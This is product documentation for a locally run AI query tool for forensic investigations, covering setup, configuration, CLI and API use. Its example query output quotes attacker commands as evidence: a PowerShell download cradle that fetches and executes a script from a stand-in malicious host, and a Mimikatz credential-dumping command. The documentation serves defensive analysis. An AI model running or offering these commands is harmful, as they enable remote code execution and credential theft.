# Feature 5: AI-Powered Analysis Agent

## Overview

The Rivendell AI Agent provides natural language querying capabilities for forensic investigations, enabling analysts to interact with investigation data using conversational queries rather than complex database queries or manual file searching.

**Version:** 2.1.0
**Status:** Production Ready
**Privacy-First:** All processing runs locally, no data sent to external APIs

## Key Features

- **Natural Language Queries**: Ask questions in plain English about your investigation
- **Multi-Artifact Search**: Searches across timelines, IOCs, processes, network connections, registry keys, and more
- **MITRE ATT&CK Integration**: Automatically identifies relevant attack techniques
- **Investigation Suggestions**: AI-powered recommendations for investigation paths
- **Case Summaries**: Automated generation of comprehensive case summaries
- **Web Interface**: Modern chat interface for interactive queries
- **CLI Interface**: Command-line tools for scripting and automation
- **Privacy-Focused**: Runs entirely locally using open-source LLMs

## Architecture

### Components

```
┌─────────────────────────────────────────────────────────┐
│                    User Interfaces                       │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │ Web UI       │  │ CLI          │  │ API          │  │
│  │ (FastAPI)    │  │ (argparse)   │  │ (REST)       │  │
│  └──────────────┘  └──────────────┘  └──────────────┘  │
└─────────────────────────────────────────────────────────┘
                          │
┌─────────────────────────────────────────────────────────┐
│               Forensic Query Engine                      │
│  ┌──────────────────────────────────────────────────┐  │
│  │  • Question Processing                            │  │
│  │  • Context Retrieval (Vector Search)              │  │
│  │  • LLM Response Generation                        │  │
│  │  • Source Citation                                │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
                          │
┌─────────────────────────────────────────────────────────┐
│                 Vector Database                          │
│  ┌──────────────────────────────────────────────────┐  │
│  │  ChromaDB / Qdrant                                │  │
│  │  • Similarity Search                              │  │
│  │  • Document Retrieval                             │  │
│  │  • Metadata Filtering                             │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
                          │
┌─────────────────────────────────────────────────────────┐
│              Forensic Data Indexer                       │
│  ┌──────────────────────────────────────────────────┐  │
│  │  • Timeline Events                                │  │
│  │  • IOCs                                           │  │
│  │  • Processes, Network, Registry                   │  │
│  │  • Cloud Logs                                     │  │
│  │  • Text Embedding (MiniLM)                        │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
                          │
┌─────────────────────────────────────────────────────────┐
│                  Local LLM                               │
│  ┌──────────────────────────────────────────────────┐  │
│  │  Ollama (recommended) or LlamaCpp                 │  │
│  │  • Llama 3 (8B, 70B)                              │  │
│  │  • Mistral                                        │  │
│  │  • Mixtral                                        │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Technology Stack

- **LLM Framework**: LangChain for orchestration
- **Local LLM**: Ollama (recommended) or LlamaCpp
- **Vector Database**: ChromaDB (default) or Qdrant
- **Embeddings**: sentence-transformers/all-MiniLM-L6-v2
- **Web Framework**: FastAPI with WebSocket support
- **CLI**: argparse with rich formatting

## Installation

### Prerequisites

```bash
# Python 3.8+ required
python --version

# Install dependencies
pip install -r requirements.txt

# Install AI-specific dependencies
pip install langchain chromadb sentence-transformers
pip install fastapi uvicorn websockets  # For web interface
```

### Ollama Setup (Recommended)

Ollama provides the easiest way to run local LLMs.

```bash
# Install Ollama
# macOS/Linux:
curl -fsSL https://ollama.com/install.sh | sh

# Windows: Download from https://ollama.com/download

# Pull a model (Llama 3 8B recommended for most use cases)
ollama pull llama3

# For better quality (requires more RAM/VRAM):
ollama pull llama3:70b

# Alternative models:
ollama pull mistral
ollama pull mixtral
```

### LlamaCpp Setup (Alternative)

For more control over model loading:

```bash
# Install llama-cpp-python
pip install llama-cpp-python

# Download a GGUF model
# Example: Llama 3 70B quantized
wget https://huggingface.co/TheBloke/Llama-3-70B-GGUF/resolve/main/llama-3-70b.Q4_K_M.gguf \
  -O /opt/rivendell/models/llama-3-70b.gguf
```

## Configuration

### AI Agent Configuration

Edit `config/ai.yml`:

```yaml
ai_agent:
  enabled: true

  model:
    type: local  # local or api

    ollama:
      model_name: "llama3"
      host: "http://localhost:11434"

    temperature: 0.1  # Lower = more factual
    max_tokens: 2048

  embedding:
    model: "sentence-transformers/all-MiniLM-L6-v2"
    device: "cpu"  # or "cuda" for GPU

  vector_db:
    type: "chroma"
    persist_dir: "/opt/rivendell/data/vector_db"

  indexing:
    auto_index: true
    artifacts_to_index:
      - timeline
      - iocs
      - processes
      - network
      - registry
      - files
      - cloud_logs

  web_interface:
    enabled: true
    port: 5687
```

## Usage

### 1. Index Case Data

Before querying, you must index your forensic artifacts:

```bash
# Index all artifacts from a case directory
rivendell-ai index CASE-001 /evidence/CASE-001

# Index specific artifact types
rivendell-ai index CASE-001 /evidence/CASE-001 \
  --timeline timeline.csv \
  --iocs iocs.csv \
  --processes processes.csv \
  --network network.csv

# Index cloud logs
rivendell-ai index CASE-001 /evidence/CASE-001 \
  --cloud-logs cloudtrail_logs.json \
  --cloud-provider aws
```

**Indexing Output:**
```
[*] Indexing case CASE-001...
[*] Output directory: /evidence/CASE-001
[*] Indexing timeline: timeline.csv
[*] Indexing IOCs: iocs.csv
[*] Indexing processes: processes.csv
[*] Indexing network: network.csv

[+] Indexing complete!

Indexed documents:
  - timeline: 1,245 documents
  - iocs: 87 documents
  - processes: 342 documents
  - network: 156 documents

Total documents in collection: 1,830
Vector database: /evidence/CASE-001/vector_db
```

### 2. Query via CLI

```bash
# Ask a question
rivendell-ai query CASE-001 "What PowerShell commands were executed?"

# Get investigation suggestions
rivendell-ai suggest CASE-001

# Generate case summary
rivendell-ai summary CASE-001 --format markdown --output summary.md

# Search for similar documents
rivendell-ai search CASE-001 "suspicious network activity"

# Get case information
rivendell-ai info CASE-001
```

**Example Query Output:**
```
[*] Loading query engine for case CASE-001...

[?] What PowerShell commands were executed?

[AI] Based on the timeline analysis, several suspicious PowerShell commands were executed:

1. **Encoded Command Execution** (2025-11-12 14:23:15)
   - powershell.exe -enc <base64_string>
   - This is commonly used to obfuscate malicious commands
   - MITRE ATT&CK: T1059.001 (PowerShell)

2. **Download Cradle** (2025-11-12 14:23:45)
   - powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
   - Downloads and executes remote PowerShell script
   - MITRE ATT&CK: T1059.001, T1105 (Ingress Tool Transfer)

3. **Credential Dumping** (2025-11-12 14:25:30)
   - powershell.exe -c "Invoke-Mimikatz -DumpCreds"
   - Attempts to dump credentials from memory
   - MITRE ATT&CK: T1003.001 (LSASS Memory)

**Red Flags:**
- All commands executed by same user account (compromised_admin)
- Commands executed within 2-minute window (automated attack)
- Network connections to known malicious IPs

**Recommended Follow-up:**
1. Examine process tree for powershell.exe parent process
2. Check for additional persistence mechanisms
3. Investigate lateral movement attempts
4. Review logs for credential usage after dumping

[Sources]
1. [timeline] timeline.csv (relevance: 1.00)
2. [process] processes.csv (relevance: 0.89)
3. [network] network.csv (relevance: 0.76)
```

### 3. Web Interface

Start the web interface:

```bash
# Start web server
python -m rivendell.ai.web_interface

# Or specify custom host/port
python -m rivendell.ai.web_interface --host 0.0.0.0 --port 5687
```

Access the interface:
```
http://localhost:5687/ai/chat/CASE-001
```

**Web Interface Features:**
- Real-time chat interface
- Source citation with links
- Example query buttons
- Query history
- Export results
- Dark/light mode

### 4. Python API

Use the AI agent programmatically:

```python
from rivendell.ai import ForensicDataIndexer, ForensicQueryEngine

# Index case data
indexer = ForensicDataIndexer(
    case_id="CASE-001",
    output_dir="/evidence/CASE-001"
)
indexer.index_timeline("timeline.csv")
indexer.index_iocs("iocs.csv")

# Query the case
engine = ForensicQueryEngine.load("CASE-001")
result = engine.query("What PowerShell commands were executed?")

print(f"Answer: {result.answer}")
print(f"Sources: {len(result.sources)}")
print(f"Confidence: {result.confidence}")

# Get investigation suggestions
suggestions = engine.suggest_investigation_paths()
for suggestion in suggestions:
    print(f"- {suggestion.title}")

# Generate case summary
summary = engine.generate_summary()
print(summary.to_markdown())
```

## Example Queries

### Timeline Questions

```
"What PowerShell commands were executed?"
"Show me all network connections to external IPs"
"What files were created in the last hour before the incident?"
"Which processes were running at 2025-11-12 14:30:00?"
"What events occurred between 14:00 and 15:00?"
"Show me all failed login attempts"
```

### Correlation Questions

```
"What events are related to IP address 192.168.1.100?"
"Show me all activity by user 'administrator'"
"What happened before the malicious file was executed?"
"Are there any IOCs related to PowerShell activity?"
"Show me the process tree for PID 1234"
"What network connections were made by suspicious processes?"
```

### Investigation Questions

```
"What MITRE ATT&CK techniques were detected?"
"What persistence mechanisms were found?"
"Show me evidence of lateral movement"
"What data exfiltration indicators are present?"
"Were any credentials compromised?"
"What privilege escalation attempts occurred?"
"Show me evidence of defense evasion"
```

### Summary Questions

```
"Summarize the attack timeline"
"What are the key findings?"
"What should I investigate next?"
"Generate an executive summary"
"What are the most critical IOCs?"
"What remediation steps are recommended?"
```

### Technical Questions

```
"What registry keys were modified?"
"Show me suspicious scheduled tasks"
"What DLLs were loaded by the malicious process?"
"Were any services created or modified?"
"What WMI event subscriptions exist?"
"Show me browser history related to the incident"
```

## CLI Reference

### index

Index case artifacts for AI querying.

```bash
rivendell-ai index <case_id> <output_dir> [options]

Options:
  --timeline FILE         Timeline CSV file
  --iocs FILE            IOCs CSV file
  --processes FILE       Processes CSV file
  --network FILE         Network CSV file
  --registry FILE        Registry CSV file
  --files FILE           Files CSV file
  --cloud-logs FILE      Cloud logs JSON file
  --cloud-provider TYPE  Cloud provider (aws, azure, gcp)
  --llm-type TYPE        LLM type (ollama, llamacpp)
  --model-name NAME      Model name (default: llama3)
  --device TYPE          Device for embeddings (cpu, cuda)
```

### query

Query case using natural language.

```bash
rivendell-ai query <case_id> <question> [options]

Options:
  --base-dir DIR         Base directory for cases
  --llm-type TYPE        LLM type (ollama, llamacpp)
  --model-name NAME      Model name
  --model-path PATH      Model path (for llamacpp)
  --temperature FLOAT    LLM temperature (default: 0.1)
  --max-tokens INT       Max tokens to generate (default: 2048)
  --no-sources           Don't show sources
  --output FILE          Save result to file
  --verbose, -v          Verbose output
```

### summary

Generate comprehensive case summary.

```bash
rivendell-ai summary <case_id> [options]

Options:
  --base-dir DIR         Base directory for cases
  --format TYPE          Output format (text, json, markdown)
  --output FILE          Save summary to file
  --llm-type TYPE        LLM type
  --model-name NAME      Model name
```

### suggest

Get AI-powered investigation suggestions.

```bash
rivendell-ai suggest <case_id> [options]

Options:
  --base-dir DIR         Base directory for cases
  --output FILE          Save suggestions to file
  --llm-type TYPE        LLM type
  --model-name NAME      Model name
```

### search

Search for similar documents using vector similarity.

```bash
rivendell-ai search <case_id> <query> [options]

Options:
  --base-dir DIR         Base directory for cases
  --top-k INT            Number of results (default: 5)
  --llm-type TYPE        LLM type
  --model-name NAME      Model name
```

### info

Show case information and statistics.

```bash
rivendell-ai info <case_id> [options]

Options:
  --base-dir DIR         Base directory for cases
```

## API Reference

### ForensicDataIndexer

Index forensic artifacts for vector search.

```python
class ForensicDataIndexer:
    def __init__(
        self,
        case_id: str,
        output_dir: str,
        config: Optional[Dict] = None
    )

    def index_timeline(self, timeline_csv: str) -> int
    def index_iocs(self, iocs_csv: str) -> int
    def index_processes(self, processes_csv: str) -> int
    def index_network(self, network_csv: str) -> int
    def index_registry(self, registry_csv: str) -> int
    def index_files(self, files_csv: str) -> int
    def index_cloud_logs(self, logs_json: str, provider: str) -> int
    def index_all(self, artifacts_dir: str) -> Dict[str, int]
    def get_collection_info(self) -> Dict[str, Any]
```

**Example:**
```python
indexer = ForensicDataIndexer("CASE-001", "/evidence/CASE-001")
indexer.index_timeline("timeline.csv")
indexer.index_iocs("iocs.csv")
counts = indexer.index_all("/evidence/CASE-001/processed")
info = indexer.get_collection_info()
print(f"Indexed {info['document_count']} documents")
```

### ForensicQueryEngine

AI-powered query engine for forensic analysis.

```python
class ForensicQueryEngine:
    def __init__(
        self,
        case_id: str,
        vector_store_dir: str,
        config: Optional[Dict] = None
    )

    def query(self, question: str) -> QueryResult
    def suggest_investigation_paths(self) -> List[InvestigationSuggestion]
    def generate_summary(self) -> CaseSummary
    def search_similar(self, text: str, top_k: int = 5) -> List[SourceDocument]
    def get_statistics(self) -> Dict[str, Any]

    @classmethod
    def load(
        cls,
        case_id: str,
        base_dir: str = None,
        config: Optional[Dict] = None
    ) -> 'ForensicQueryEngine'
```

**Example:**
```python
engine = ForensicQueryEngine.load("CASE-001")

# Query
result = engine.query("What PowerShell commands were executed?")
print(result.answer)

# Get suggestions
suggestions = engine.suggest_investigation_paths()
for s in suggestions:
    print(f"{s.title}: {s.description}")

# Generate summary
summary = engine.generate_summary()
markdown = summary.to_markdown()
```

### Data Models

#### QueryResult

```python
@dataclass
class QueryResult:
    question: str
    answer: str
    sources: List[SourceDocument]
    confidence: float
    timestamp: datetime
    processing_time: float
    metadata: Dict[str, Any]

    def to_dict(self) -> Dict[str, Any]
```

#### SourceDocument

```python
@dataclass
class SourceDocument:
    content: str
    metadata: Dict[str, Any]
    relevance_score: float
```

#### InvestigationSuggestion

```python
@dataclass
class InvestigationSuggestion:
    title: str
    description: str
    priority: str  # high, medium, low
    attck_techniques: List[str]
    artifacts_to_check: List[str]
    queries: List[str]

    def to_dict(self) -> Dict[str, Any]
```

#### CaseSummary

```python
@dataclass
class CaseSummary:
    case_id: str
    executive_summary: str
    key_findings: List[str]
    timeline_summary: str
    iocs_detected: List[Dict[str, Any]]
    attck_techniques: List[str]
    recommendations: List[str]
    generated_at: datetime

    def to_dict(self) -> Dict[str, Any]
    def to_markdown(self) -> str
```

## Integration with Rivendell Workflow

### Automated Indexing

Configure automatic indexing after analysis completes:

```yaml
# config/ai.yml
indexing:
  auto_index: true
  index_on_analysis_complete: true
```

This will automatically index artifacts when:
- Timeline generation completes
- IOC extraction finishes
- Artifact processing completes
- Cloud log analysis finishes

### Integration Points

```python
# In your analysis pipeline
from rivendell.ai import ForensicDataIndexer

def on_analysis_complete(case_id: str, output_dir: str):
    """Called when analysis completes."""
    # Index artifacts for AI
    indexer = ForensicDataIndexer(case_id, output_dir)
    counts = indexer.index_all(output_dir)
    print(f"[+] Indexed {sum(counts.values())} documents for AI querying")
```

## Performance Optimization

### Hardware Requirements

**Minimum:**
- CPU: 4 cores
- RAM: 8 GB
- Storage: 10 GB for models + 1-5 GB per case

**Recommended:**
- CPU: 8+ cores
- RAM: 16+ GB
- GPU: NVIDIA GPU with 8+ GB VRAM (for faster inference)
- Storage: 50 GB for models + storage for cases

### Model Selection

| Model | Size | RAM | Quality | Speed | Use Case |
|-------|------|-----|---------|-------|----------|
| Llama 3 8B | 4.7 GB | 8 GB | Good | Fast | General use |
| Llama 3 70B | 40 GB | 48 GB | Excellent | Slow | High accuracy |
| Mistral 7B | 4.1 GB | 8 GB | Good | Fast | Balanced |
| Mixtral 8x7B | 26 GB | 32 GB | Excellent | Medium | Advanced |

### GPU Acceleration

```yaml
# config/ai.yml
embedding:
  device: "cuda"  # Use GPU for embeddings

performance:
  gpu_acceleration: true
  gpu_device_id: 0
```

For LlamaCpp:
```yaml
model:
  llamacpp:
    n_gpu_layers: -1  # Offload all layers to GPU
```

### Indexing Optimization

```python
# Index in batches for large datasets
indexer = ForensicDataIndexer(case_id, output_dir, config={
    'batch_size': 64  # Process 64 documents at a time
})

# Limit documents per type
config = {
    'max_docs_per_type': 10000  # Index max 10k docs per type
}
```

## Security and Privacy

### Data Privacy

The AI Agent is designed with privacy as a core principle:

✅ **Local Processing Only**
- All LLM inference runs locally
- No data sent to external APIs
- Vector embeddings stored locally

✅ **Configurable Data Retention**
```yaml
privacy:
  data_retention_days: 365
  anonymize_logs: true
```

✅ **Encryption Support**
```yaml
privacy:
  encrypt_vectors: true  # Encrypt vector database
```

### Chain of Custody

All queries are logged for chain of custody:

```yaml
forensic:
  chain_of_custody:
    enabled: true
    log_queries: true
    include_metadata: true
```

Query logs include:
- Timestamp
- Case ID
- Question asked
- Answer provided
- Sources used
- User/analyst information

### Access Control

Implement access control at the application level:

```python
from fastapi import Depends, HTTPException
from fastapi.security import HTTPBearer

security = HTTPBearer()

@app.post("/ai/cases/{case_id}/query")
async def query_case(case_id: str, token: str = Depends(security)):
    # Verify analyst has access to case
    if not verify_access(token, case_id):
        raise HTTPException(status_code=403, detail="Access denied")

    # Process query
    ...
```

## Troubleshooting

### Common Issues

#### 1. "Model not found" Error

**Problem:** LLM model not downloaded or path incorrect.

**Solution:**
```bash
# For Ollama
ollama pull llama3

# For LlamaCpp
# Download model and update config with correct path
```

#### 2. "Out of Memory" Error

**Problem:** Model too large for available RAM.

**Solution:**
- Use a smaller model (Llama 3 8B instead of 70B)
- Use quantized models (Q4_K_M instead of full precision)
- Enable GPU offloading

```yaml
model:
  ollama:
    model_name: "llama3:8b"  # Use 8B variant
```

#### 3. Slow Query Performance

**Problem:** Queries taking too long.

**Solution:**
- Reduce `top_k` (number of retrieved documents)
- Use GPU acceleration
- Use smaller embedding model
- Enable query caching

```yaml
query:
  top_k: 5  # Reduce from default 10
  cache_enabled: true
```

#### 4. "Case not indexed" Error

**Problem:** Trying to query before indexing.

**Solution:**
```bash
# Index the case first
rivendell-ai index CASE-001 /evidence/CASE-001
```

#### 5. Poor Answer Quality

**Problem:** AI giving irrelevant or incorrect answers.

**Solution:**
- Increase `top_k` to retrieve more context
- Reduce `temperature` for more factual responses
- Use a larger model (70B vs 8B)
- Ensure artifacts are properly indexed

```yaml
model:
  temperature: 0.05  # More deterministic

query:
  top_k: 15  # More context
```

### Debug Mode

Enable verbose logging:

```bash
# CLI
rivendell-ai query CASE-001 "question" --verbose

# Config
logging:
  level: "DEBUG"
```

### Testing Connection

Test your setup:

```bash
# Test Ollama
curl http://localhost:11434/api/tags

# Test indexing
rivendell-ai info CASE-001

# Test query engine
rivendell-ai search CASE-001 "test" --top-k 1
```

## Best Practices

### 1. Index Management

- **Index regularly**: Keep vector database updated as new artifacts are processed
- **Separate collections**: Use separate collections for different cases
- **Clean old data**: Remove indexed data for closed cases

```python
# Delete old case data
import shutil
shutil.rmtree(f"/opt/rivendell/data/vector_db/case_{case_id}")
```

### 2. Query Optimization

- **Be specific**: More specific questions get better answers
- **Use context**: Reference timestamps, IPs, or usernames
- **Follow up**: Use previous answers to refine questions

**Good:**
```
"What PowerShell commands were executed by user 'admin' between 14:00 and 15:00?"
```

**Less Good:**
```
"Show me PowerShell stuff"
```

### 3. Verification

Always verify AI-generated insights:
- Check sources provided
- Cross-reference with raw artifacts
- Don't rely solely on AI for conclusions
- Use AI as an assistant, not a replacement for analysis

### 4. Model Selection

- **Development/Testing**: Llama 3 8B (fast, good enough)
- **Production**: Llama 3 70B or Mixtral (better quality)
- **Resource-constrained**: Mistral 7B (smaller, still capable)

### 5. Privacy Compliance

- Keep AI processing local
- Document AI usage in reports
- Include disclaimers about AI-generated content
- Maintain chain of custody logs

## Advanced Features

### Custom Prompts

Customize AI behavior with custom prompts:

```yaml
# config/ai.yml
prompts:
  system: |
    You are a specialized ransomware analyst...

  query: |
    Focus on identifying ransomware indicators...
```

### Multi-Case Queries

Query across multiple cases:

```python
engines = {
    "CASE-001": ForensicQueryEngine.load("CASE-001"),
    "CASE-002": ForensicQueryEngine.load("CASE-002")
}

for case_id, engine in engines.items():
    result = engine.query("Were any IOCs found related to ransomware?")
    print(f"{case_id}: {result.answer}")
```

### Integration with MITRE ATT&CK

Automatic ATT&CK technique identification:

```python
result = engine.query("What attack techniques were used?")

# Extract techniques from answer
techniques = result.metadata.get('attck_techniques', [])
for technique in techniques:
    print(f"- {technique}: {get_technique_name(technique)}")
```

### Report Generation

Generate investigation reports:

```python
from rivendell.ai import ForensicQueryEngine

engine = ForensicQueryEngine.load("CASE-001")

# Generate comprehensive report
report = {
    "executive_summary": engine.generate_summary(),
    "key_questions": [
        engine.query("What was the initial access vector?"),
        engine.query("What persistence mechanisms were found?"),
        engine.query("Was data exfiltrated?")
    ],
    "suggestions": engine.suggest_investigation_paths()
}

# Export to markdown
with open("report.md", "w") as f:
    f.write(report["executive_summary"].to_markdown())
    f.write("\n\n## Investigation Analysis\n\n")
    for result in report["key_questions"]:
        f.write(f"### {result.question}\n\n")
        f.write(f"{result.answer}\n\n")
```

## Roadmap

### Planned Enhancements

- [ ] **Fine-tuned Models**: Forensic-specific model training
- [ ] **Multi-modal Analysis**: Image and document analysis
- [ ] **Collaborative Queries**: Multi-analyst query sessions
- [ ] **Auto-IOC Extraction**: Automatic IOC extraction from responses
- [ ] **Timeline Visualization**: Visual timeline generation from queries
- [ ] **Export Formats**: Word, PDF report generation
- [ ] **Real-time Indexing**: Stream artifacts as they're processed
- [ ] **Query Templates**: Pre-built query templates for common scenarios

## Support and Resources

### Documentation
- Implementation Guide: `docs/IMPLEMENTATION_GUIDE.md`
- API Reference: `docs/API_REFERENCE.md`
- Configuration: `config/ai.yml`

### Community
- GitHub Issues: Report bugs and request features
- Discussions: Share use cases and best practices

### Training Materials
- Video tutorials (coming soon)
- Example investigations
- Query cookbook

## Conclusion

The Rivendell AI Agent transforms forensic analysis by enabling natural language interaction with investigation data. By keeping all processing local and privacy-focused, it provides powerful AI capabilities without compromising the security of sensitive forensic evidence.

Start by indexing a small case, experiment with different queries, and gradually incorporate the AI agent into your investigation workflow. The more you use it, the more effective it becomes at understanding your investigative needs.

**Remember:** AI is a tool to enhance your analysis, not replace it. Always verify AI-generated insights against raw evidence and use professional judgment in your conclusions.

---

**Version:** 2.1.0
**Last Updated:** 2025-11-12
**Author:** Rivendell DF Acceleration Suite
